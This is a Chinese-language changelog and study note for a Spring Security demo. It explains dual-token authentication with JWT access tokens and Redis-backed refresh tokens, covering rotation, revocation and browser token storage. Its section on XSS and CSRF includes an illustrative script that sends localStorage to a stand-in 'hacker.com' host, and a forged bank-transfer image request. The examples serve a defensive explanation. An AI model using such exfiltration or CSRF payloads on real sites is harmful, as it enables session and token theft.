# CHANGELOG_09 — 双 Token 认证方案（Access Token + Refresh Token）

> 日期：2026-07-17
> 模块：hm-token-demo（独立项目）
> 方案：Access Token（JWT 15min） + Refresh Token（UUID → Redis 7天）
> 场景：对外 API 平台，第三方开发者调用

---

## 一、这个模块解决什么问题

hm-admin 是后台管理系统，内网 + 短时间使用 → 单 JWT 就够了。

但如果场景换成**对外 API 平台**（第三方开发者拿你的 API 做二次开发），问题变了：

| 问题 | 后台管理 | 对外 API 平台 |
|------|:--:|:--:|
| 网络暴露面 | 内网/VPN，攻击者接触不到 | **公网**，任何人都能请求 |
| 使用模式 | 上班登录，干完就走 | **程序 7x24 小时调用** |
| Token 过期影响 | 重新登录一次，没什么 | **程序中断，第三方业务受影响** |
| 安全风险 | Token 泄露概率极低 | Token 可能被中间人截获 |
| 吊销需求 | 开除了删 DB 用户即可 | **发现异常调用，需即时吊销某个 Token** |

双 Token 就是为这个场景设计的。

---

## 二、双 Token 是什么

```
登录时一次签发两个 Token：

Access Token（JWT）
  有效期：15 分钟
  用途：每次业务请求都带
  格式：JWT，包含用户名和过期时间
  存储：客户端内存（不管安全存储）

Refresh Token（UUID）
  有效期：7 天
  用途：只在 accessToken 过期时用一次，换新的 accessToken
  格式：随机 UUID，存 Redis
  存储：客户端安全存储（HttpOnly Cookie 或 Keychain）
```

---

## 三、前后端交互流程

### 3.1 阶段一：登录（获取双 Token）

```
客户端                                    服务端
──────                                    ──────
POST /auth/login
Content-Type: application/json
{
  "username": "developer1",
  "password": "dev123"
}
  ─────────────────────────────────────►
                                         1. Security: /auth/login → permitAll → 放行
                                         2. AuthController.login():
                                            ├─ 校验用户名密码（BCrypt.matches）
                                            ├─ accessToken = JWT（sub=username, exp=now+15min, HS256）
                                            └─ refreshToken = UUID
                                                 └─ Redis SET refresh:token:{uuid} username EX 604800
                                         3. 返回
  ◄─────────────────────────────────────
{
  "accessToken":  "eyJhbG...",    ← JWT, 15分钟有效
  "refreshToken": "a1b2c3d4...",  ← UUID, Redis 7天有效
  "tokenType":    "Bearer",
  "expiresIn":    900             ← accessToken 剩余秒数，客户端据此判断何时刷新
}

客户端存储策略：
  accessToken  → 内存变量（每次请求用，过期就丢）
  refreshToken → 持久化存储（HttpOnly Cookie / Keychain / 安全文件）
```

### 3.2 阶段二：正常业务请求（带 Access Token）

```
客户端                                    服务端
──────                                    ──────
GET /api/data
Authorization: Bearer eyJhbG...
  ─────────────────────────────────────►
                                         1. JwtAuthenticationFilter:
                                            ├─ 提取 "Bearer " 后的 JWT
                                            ├─ JwtTokenProvider.validateToken()
                                            │   └─ 验签通过 + 未过期
                                            ├─ JwtTokenProvider.getUsername() → "developer1"
                                            └─ SecurityContextHolder.setAuthentication(auth)
                                         2. FilterSecurityInterceptor:
                                            ├─ URL: /api/data → authenticated()
                                            ├─ SecurityContext 中有 Authentication → 放行
                                         3. ApiController.getData() → 执行业务
  ◄─────────────────────────────────────
HTTP 200
{
  "code": 200,
  "data": [...]
}
```

### 3.3 阶段三：Access Token 过期 + 静默刷新

```
客户端                                    服务端
──────                                    ──────
GET /api/data
Authorization: Bearer eyJhbG...  ← 已过期的 accessToken
  ─────────────────────────────────────►
                                         1. JwtAuthenticationFilter:
                                            └─ validateToken() → ExpiredJwtException → false
                                            └─ 不设 Authentication → 放行
                                         2. FilterSecurityInterceptor:
                                            └─ 未认证 → 触发 EntryPoint
  ◄─────────────────────────────────────
HTTP 401
{
  "code": 401,
  "message": "未登录或 Access Token 已过期，请用 refreshToken 刷新"
}

客户端收到 401，触发刷新逻辑：

POST /auth/refresh
Content-Type: application/json
{
  "refreshToken": "a1b2c3d4..."
}
  ─────────────────────────────────────►
                                         1. Security: /auth/refresh → permitAll → 放行
                                         2. AuthController.refresh():
                                            ├─ Redis GET refresh:token:a1b2c3d4...
                                            │   └─ 存在且未过期 → "developer1"
                                            ├─ 生成新 accessToken = JWT(sub=developer1, exp=now+15min)
                                            └─ 返回（refreshToken 不变，不重新签发）
  ◄─────────────────────────────────────
HTTP 200
{
  "code": 200,
  "data": {
    "accessToken": "eyJhbG...",   ← 新的 JWT
    "tokenType":    "Bearer",
    "expiresIn":    900
  }
}

客户端更新内存中的 accessToken，重试失败的请求：

GET /api/data
Authorization: Bearer <新的 accessToken>
  ─────────────────────────────────────►
  ◄─────────────────────────────────────
HTTP 200 ← 正常返回数据

整个过程对终端用户透明，无感知。
```

### 3.4 重要：刷新后旧 accessToken 仍有效

```
刷新操作实际做了什么：

  POST /auth/refresh { refreshToken }
    → Redis 里 refreshToken 有效 → 签发一个新的 accessToken → 返回

刷新操作没做的：

  ✗ 没让旧的 accessToken 失效
  ✗ 没通知 JwtAuthenticationFilter "这个 token 不要了"
  ✗ 没有任何地方记录"旧 token 已作废"

为什么旧 token 还能用：

  JwtAuthenticationFilter 验签时只检查两件事：
    1. 签名对不对？
       → 旧的 token 是我签发的 → 签名对 ✓
    2. 过期没？
       → 刷新时旧 token 可能还剩 5 分钟才到期 → 没过期 ✓
    3. 有没有黑名单？
       → 没有黑名单机制 → 不检查 ✗

  两个条件都满足 → 放行。Filter 不知道你刷新过了，也没人告诉它。

这不是 bug，是无状态 JWT 的设计取舍：

            无状态（不存）              有状态（Session/黑名单）
  ────────  ───────────               ──────────────────────
  优点      验签极快，不查 Redis         随时作废
  缺点      签发了就收不回来            每次请求都查 Redis

  选了"快"就得接受"收不回来"。所以 accessToken 过期时间必须设短——
  泄露窗口 = 到期时间，15 分钟就是为这个设计的。

如果业务必须即时作废，加黑名单：

  刷新时：
    String oldJti = 从旧 accessToken 里取出 JWT ID;
    redisTemplate.opsForValue()
        .set("token:black:" + oldJti, "1", 15, TimeUnit.MINUTES);

  Filter 里：
    if (redisTemplate.hasKey("token:black:" + jti)) {
        // 被拉黑了 → 401
        return;
    }

本 Demo 没加——15min 窗口可接受，且加了黑名单后每次验签都要查 Redis，
违背了"accessToken 无状态快验"的设计初衷。
```

### 3.4.1 同一用户同时拥有多个有效 accessToken 的风险

```
时间线：
  T=0    你登录 → 拿到 accessToken₁
  T=10   攻击者截获 accessToken₁
  T=13   你用 accessToken₁ 调 API → 正常
         攻击者用 accessToken₁ 调 API → 正常（冒充你成功）
  T=15   accessToken₁ 过期
         你拿 refreshToken 换 accessToken₂ → 你的请求恢复正常
  T=20   攻击者手里的 accessToken₁ 已过期 → 无法再冒充你

泄露窗口 = 15 分钟（accessToken 的有效期）。
多个 token 本身不是问题——它们都属于同一个人，权限一样。
问题在于被截获的那个旧 token 在过期前仍可用。
```

### 3.4.2 根本解法：Refresh Token 轮换（Rotation）

```
轮换前（当前 demo）：
  POST /auth/refresh { refreshToken: RT }
    → 验证 RT → 返回 { accessToken: 新AT }
    → RT 不变，可以反复用，7 天内都有效

轮换后（生产标准）：
  POST /auth/refresh { refreshToken: RT₁ }
    → 验证 RT₁
    → Redis DEL RT₁                           ← 旧的立即作废
    → 生成新 RT₂ → Redis SET                   ← 发新的
    → 生成新 AT
    → 返回 { accessToken: 新AT, refreshToken: 新RT₂ }

效果：
  同一个 refreshToken 只能用一次。用过就废。
```

**类比**：酒店用身份证换房卡。前台验证后给你新房卡，同时把旧身份证收走，换一张新身份证给你。下次来换房卡得用新身份证。别人拿到旧身份证的复印件来换 → 已作废 → 被拒。

**为什么这才安全**：

```
你和攻击者都持有同一个 refreshToken：

  不轮换：
    → 两个人各自刷新都能成功 → 攻击者一直有有效 token → 你不知情

  轮换：
    → 谁先刷新谁拿到新的 refreshToken，旧的立即作废
    → 另一个人拿旧的来刷新 → 失败（Redis 里已删）
    → 如果你被踢了 → 你知道 refreshToken 泄露了 → 改密码
    → 如果攻击者失败 → 攻击者被拦住了
    
    refreshToken 只能成功用一次，不能两人都成功。
```

**两种策略对照**：

| 维度 | 不轮换 | 轮换 |
|---|---|---|
| refreshToken 寿命 | 从签发到 7 天自然过期 | 只能用一次，每次刷新换新的 |
| 泄露窗口 | 最长 7 天 | 一次（下一次谁失败谁暴露） |
| 每次刷新做的事 | Redis GET 验证 → 发新 AT | Redis GET 验证 → DEL 旧的 → SET 新的 → 发新 AT + 新 RT |
| 客户端做的事 | 拿新 AT | 拿新 AT + 新 RT（两个都要更新） |
| 实现复杂度 | 低 | 中 |
| refreshToken 失效后的结果 | 直接跳转登录页 | 也跳转登录页 |

两种都行，看系统安全敏感度。轮换多一次 Redis DEL + 一次 SET，对性能影响可以忽略——刷新操作本来就低频（15 分钟一次，不是每个请求），多两次 Redis 操作不值一提。

**所以 `/auth/refresh` 的正确行为不是"延长 accessToken"，而是"用掉一个 refreshToken，换一对全新的 Token（accessToken + refreshToken）"。** 这是生产标准做法——Auth0、Okta、Google OAuth2 全是这么做的。我们的 demo 没做轮换，但面试时你应该主动提这个。

### 3.5 阶段五：登出/吊销

```
客户端                                    服务端
──────                                    ──────
POST /auth/logout
Content-Type: application/json
{
  "refreshToken": "a1b2c3d4..."
}
  ─────────────────────────────────────►
                                         1. Security: /auth/logout → permitAll → 放行
                                         2. AuthController.logout():
                                            └─ Redis DEL refresh:token:a1b2c3d4...
                                         3. 返回
  ◄─────────────────────────────────────
HTTP 200
{
  "code": 200,
  "message": "已登出，Refresh Token 已吊销"
}

吊销后：
  - 当前 accessToken 尚未过期（剩余 ≤15min）→ 仍可调用 API
  - accessToken 过期后 → 客户端拿 refreshToken 刷新 → Redis 已删 → 401
  - 客户端收到 401 → 无法刷新 → 跳转登录页
  - 如需立即失效 accessToken，需额外引入黑名单机制
```

### 3.6 完整时序

```
 客户端                              服务端                         Redis
 ──────                              ──────                         ─────
   │                                    │                              │
   │── POST /auth/login ──────────────►│                              │
   │                                    │── SET refresh:token:xxx ───►│ (7天)
   │◄── accessToken + refreshToken ────│                              │
   │                                    │                              │
   │── GET /api (AT₁) ────────────────►│                              │
   │◄── 200 ──────────────────────────│                              │
   │   ...重复 N 次...                 │                              │
   │                                    │                              │
   │   [15min 后 AT₁ 过期]              │                              │
   │── GET /api (AT₁) ────────────────►│                              │
   │◄── 401 ──────────────────────────│                              │
   │                                    │                              │
   │── POST /auth/refresh (RT) ───────►│                              │
   │                                    │── GET refresh:token:xxx ───►│
   │                                    │◄── "developer1" ───────────│
   │◄── 新 accessToken AT₂ ────────────│                              │
   │                                    │                              │
   │── GET /api (AT₂) ────────────────►│                              │
   │◄── 200 ──────────────────────────│                              │
   │   ...继续正常调用...               │                              │
   │                                    │                              │
   │── POST /auth/logout (RT) ────────►│                              │
   │                                    │── DEL refresh:token:xxx ───►│
   │◄── 200 "已吊销" ──────────────────│                              │
   │                                    │                              │
   │   [15min 后 AT₂ 过期]              │                              │
   │── POST /auth/refresh (RT) ───────►│                              │
   │                                    │── GET refresh:token:xxx ───►│
   │                                    │◄── null ──────────────────│ (已删除)
   │◄── 401 "refreshToken 无效" ───────│                              │
   │                                    │                              │
   │── 跳转登录页，重新开始              │                              │
```

---

## 四、两个 Token 为什么一长一短

```
为什么不让 accessToken 也 7 天过期？

因为 accessToken 在每个请求里传来传去，是最容易被截获的。
如果它 7 天有效 → 截获后黑客能用 7 天。

accessToken 15min 过期 → 截获后最多用 15 分钟。
refreshToken 虽然 7 天有效，但只在一类请求中出现（/auth/refresh），
而且存 Redis 可以随时删 = 随时吊销。
```

---

## 五、Refresh Token 为什么不用 JWT 而用 UUID

hm-admin 里 token 是 JWT——服务器不存，验签就行。

Refresh Token 不一样——它必须**存 Redis**，原因有二：

1. **可吊销**：删 Redis key → refreshToken 立即作废。JWT 签发了就收不回来，除非加黑名单（那还不如直接存 Redis）
2. **安全**：UUID 随机无规律，不可伪造。JWT 的 payload 是 base64，虽然不能篡改（有签名），但可以被解码看到内容

```
JWT 做 Access Token  → 对的，无状态，验签快
UUID + Redis 做 Refresh Token → 对的，可吊销，不可伪造
```

---

## 六、和 hm-admin（单 Token）的对比

| 维度 | hm-admin（单 Token） | hm-token-demo（双 Token） |
|------|---------------------|-------------------------|
| 场景 | 后台管理（内网） | 对外 API 平台（公网） |
| Token 数量 | 1 个 JWT | 2 个：JWT + UUID |
| Access Token | 即唯一的 Token，2h | JWT 15min |
| Refresh Token | 无 | UUID 存 Redis 7天 |
| 吊销方式 | 只能等 Token 过期 | 删 Redis → 15min 后自动下线 |
| 用户数据 | DB（RBAC 五表） | yml 配置（模拟 2 个用户） |
| 权限模型 | RBAC（角色+权限） | 无（已登录即可调 API） |
| 复杂度 | 中（14 个类） | 低（11 个类） |

---

## 七、关键代码

### 登录：签发两个 Token

```java
@PostMapping("/login")
public Object login(@Valid @RequestBody LoginRequest request) {
    // 查用户、比密码
    DemoUser user = demoUsers.findByUsername(request.getUsername());
    if (user == null || !passwordEncoder.matches(request.getPassword(), user.getEncodedPassword())) {
        return error(401, "用户名或密码错误");
    }

    // 签发双 Token
    String accessToken = jwtTokenProvider.generateAccessToken(user.getUsername());   // JWT 15min
    String refreshToken = refreshTokenService.createRefreshToken(user.getUsername()); // UUID → Redis 7天

    return ok(new LoginResponse(accessToken, refreshToken, "Bearer", 900));
}
```

### RefreshTokenService：存 Redis 可吊销

```java
// 登录时：生成 UUID → 存 Redis
public String createRefreshToken(String username) {
    String refreshToken = IdUtil.simpleUUID();   // 随机 UUID
    redisTemplate.opsForValue().set(
        "refresh:token:" + refreshToken,
        username,
        7, TimeUnit.DAYS);                       // 7 天过期
    return refreshToken;
}

// 刷新时：查 Redis
public String validateAndGetUsername(String refreshToken) {
    return redisTemplate.opsForValue()
        .get("refresh:token:" + refreshToken);   // null = 过期/被删
}

// 登出时：删 Redis = 吊销
public void revokeRefreshToken(String refreshToken) {
    redisTemplate.delete("refresh:token:" + refreshToken);
}
```

### Security 配置：三个放行 URL

```java
http.authorizeRequests()
    // 这三个不需要 accessToken
    .antMatchers("/auth/login", "/auth/refresh", "/auth/logout").permitAll()
    // API 需要带有效 accessToken
    .antMatchers("/api/**").authenticated();
```

### 客户端调用伪代码

```javascript
// 前端/AI Agent/第三方 SDK 的标准做法
async function apiRequest(url) {
    let res = await fetch(url, { headers: { Authorization: `Bearer ${accessToken}` } });

    if (res.status === 401) {
        // accessToken 过期了 → 拿 refreshToken 换新的
        let refreshRes = await fetch('/auth/refresh', {
            method: 'POST',
            body: JSON.stringify({ refreshToken })
        });
        if (refreshRes.ok) {
            accessToken = refreshRes.data.accessToken;   // 更新内存中的 accessToken
            return apiRequest(url);                       // 用新 token 重试
        } else {
            redirectToLogin();  // refreshToken 也过期了 → 重新登录
        }
    }

    return res;
}
```

---

## 八、Token 存储安全——前端该放哪里

### 8.1 浏览器能存东西的四个地方

```
┌─────────────────────────────────────────────────────────┐
│  浏览器                                                  │
│                                                         │
│  1. JavaScript 变量（内存）                              │
│     let token = "eyJhbG..."                             │
│     页面关闭就没了，JS 能读写                            │
│                                                         │
│  2. localStorage（本地存储）                             │
│     持久化，关了浏览器也不丢                              │
│     JS 能读写 ← 任何脚本都能读，XSS 一打就穿             │
│                                                         │
│  3. Cookie（普通）                                      │
│     每次 HTTP 请求自动带过去                              │
│     JS 能读写 ← document.cookie 直接拿                  │
│                                                         │
│  4. Cookie（HttpOnly）                                  │
│     和 Cookie 一样，但——                                  │
│     JS 完全读不到 ✗  浏览器只在发请求时自动带            │
└─────────────────────────────────────────────────────────┘
```

### 8.2 两种攻击方式

```
XSS（跨站脚本注入）：
  你的网站引了一个被黑的第三方广告脚本 →
  <script>
    fetch('https://hacker.com/steal', {
      body: JSON.stringify(localStorage)  // 偷走所有 localStorage 数据
    })
  </script>
  → localStorage 里的 Token 被盗
  → JS 变量里的 Token 可能被盗（看脚本怎么写的）
  → HttpOnly Cookie 里的 Token —— document.cookie 读不到，偷不走

CSRF（跨站请求伪造）：
  你登录了 bank.com，Cookie 里有登录态 →
  黑客邮件："点我看猫咪！" → 跳转黑客网站 →
  黑客网站偷偷发 <img src="https://bank.com/transfer?to=hacker&amount=10000">
  → 浏览器自动带 bank.com 的 Cookie → bank 以为是你在转账
  → 如果 Cookie 加了 SameSite=Strict，跨站请求不携带 Cookie，无效
```

### 8.3 各自放哪

```
Access Token（15min）：
  存放：JS 内存变量
  原因：每次请求手动塞 Authorization header，不靠 Cookie 自动带
        这样 CSRF 无法利用它——不是 Cookie，浏览器不会自动带
  风险：XSS 可能读到 → 但 15min 过期，泄露窗口极短

Refresh Token（7天）：
  存放：HttpOnly + Secure + SameSite Cookie
  原因：
    1. HttpOnly → JS 读不到 → XSS 攻击无效
    2. Secure → 只走 HTTPS → 网络中间人抓不到
    3. SameSite=Strict → 跨站请求不携带 → CSRF 攻击无效
    4. Path=/auth → 只在 /auth/* 下自动带，/api/* 请求不带，减少暴露
  风险：无（除非 HTTPS 被破，那是 TLS 级别的事了）
```

### 8.4 混合策略图解

```
请求类型          带了什么                  浏览器怎么带的
────────          ──────                   ────────────
GET /api/data     accessToken（Header）     JS 手动塞进 Authorization
                  Cookie 不自动带          （Path=/auth 不匹配 /api/data）

POST /auth/refresh  refreshToken（Cookie） 浏览器自动带（Path=/auth 匹配）
                  accessToken 不带         （已过期，不需要）
```

### 8.5 生产登录响应示例

```
HTTP/1.1 200 OK
Set-Cookie: refreshToken=xxx; HttpOnly; Secure; SameSite=Strict; Path=/auth; Max-Age=604800

{
  "accessToken": "eyJhbG...",
  "tokenType":    "Bearer",
  "expiresIn":    900
}

refreshToken 不在 JSON body 里，只在 Cookie 里。
JS 从头到尾不知道 refreshToken 是什么，摸都摸不到。
```

### 8.6 Demo 为什么没这样做

```
Demo 把 refreshToken 放 JSON body ——
  目的：Postman 里你能看到完整的请求/响应交互
        手动提取 refreshToken → 手动调 /refresh → 每一步透明

生产中 refreshToken 放 HttpOnly Cookie：
  Postman 里你看不到它怎么传的 → 不适合学习演示

面试时指出这个差异 → 说明你知道 Demo 和生产之间的差距，知道怎么做才是安全的。
```

### 8.7 安全 Checklist

```
已做（Demo 级别）：
  ✓ 双 Token 分离签发
  ✓ accessToken JWT 15min 短期
  ✓ refreshToken UUID + Redis 可吊销
  ✓ 吊销后 refresh 返回 401

Demo 做不到的（依赖浏览器 + HTTPS 环境）：
  ◐ refreshToken 放 JSON body → 生产改 HttpOnly Cookie
  ◐ 无 CSRF 保护 → 生产加 SameSite

生产应追加：
  □ HTTPS（不配就是明文传输，Token 随便抓）
  □ refreshToken → HttpOnly + Secure + SameSite Cookie
  □ refreshToken 轮换（每次 /refresh 发新旧两个 RT，旧的立即 Redis DEL）
       → 防止 refreshToken 泄露后被攻击者反复刷新
  □ accessToken 黑名单（Redis 存登出后的 accessToken jti，TTL = 剩余有效期）
  □ 密码错误次数限制（Redis 记录失败次数，超阈值锁定）
  □ IP 异常检测（同一 refreshToken 短时间内从不同 IP 刷新 → 告警/吊销）
```

---

## 九、面试话术

### 简历一句话

```
设计双 Token 认证方案：Access Token（JWT 15min 无状态）用于业务请求，
Refresh Token（UUID + Redis 7天可吊销）用于静默刷新，兼顾安全性与用户体验
```

### 面试官问"你们为什么用双 Token？"

> 看场景。C 端 App 或对外 API 平台，公网暴露 + 用户全天在线 + Token 可能被截获。单 Token 有三难：过期时间怎么设都不对——设短了用户频繁登录，设长了泄露风险大；要踢人只能靠黑名单。双 Token 各司其职：accessToken 短期 15 分钟，每次请求带，泄露了窗口极短；refreshToken 长期 7 天存 Redis，只在刷新接口出现一次，服务端可随时删 Redis key 吊销。

### 面试官追问"Refresh Token 为什么不用 JWT 而存 Redis？"

> Refresh Token 的核心需求是"能随时吊销"。JWT 是无状态的，签发了收不回来——除非引入黑名单，那还不如直接存 Redis。用随机 UUID + Redis 就能做到：删 key = 吊销，逻辑简单可靠。Access Token 才适合用 JWT——每次请求都要验，无状态验签比查 Redis 快。

### 面试官追问"登出后 accessToken 还没过期，怎么处理？"

> 我们的 demo 没做黑名单——等 15min 自然过期。生产可以加 Redis 黑名单，登出时把 accessToken 的 jti（JWT ID）存进 Redis，过期时间设为 accessToken 剩余时长。Filter 里验签后额外查一次黑名单。但大部分场景 15min 泄露窗口是可接受的——攻击者拿到 accessToken 也只能用 15 分钟。

### 面试官追问"什么时候用单 Token，什么时候双 Token？"

> 后台管理系统、内部工具——内网访问、短时间使用 → 单 JWT 够。C 端 App、对外 API 平台、金融系统——公网暴露、用户不能被打断、需要即时吊销 → 双 Token。判断标准是场景，不是用户数量。我们点评项目做了两个模块：hm-admin 后台用单 Token，hm-token-demo 模拟对外 API 用双 Token，对照着理解两种方案。

---

## 十、速记卡

```
双 Token 速记
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
两个 Token 各司其职：

Access Token（JWT, 15min）
  - 每次请求都带
  - 无状态验签，不查 Redis
  - 短期 → 泄露风险小

Refresh Token（UUID + Redis, 7天）
  - 只在 /refresh 接口出现一次
  - 存 Redis → 随时删 key 吊销
  - 长期 → 用户不用频繁登录

核心公式：
  登录 → 发两个 Token
  accessToken 过期 → refreshToken 换新的（用户无感知）
  吊销 → 删 Redis → refreshToken 作废
  → 等 accessToken 过期 → 客户端无法刷新 → 必须重新登录

适用场景：公网 + 长期在线 + 需要吊销能力
不适用：内网后台管理（单 JWT 够了）

项目两个模块对照：
  hm-admin       → 后台管理 → 单 Token（JWT 2h）
  hm-token-demo  → 对外 API → 双 Token（JWT 15min + Redis UUID 7天）
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```
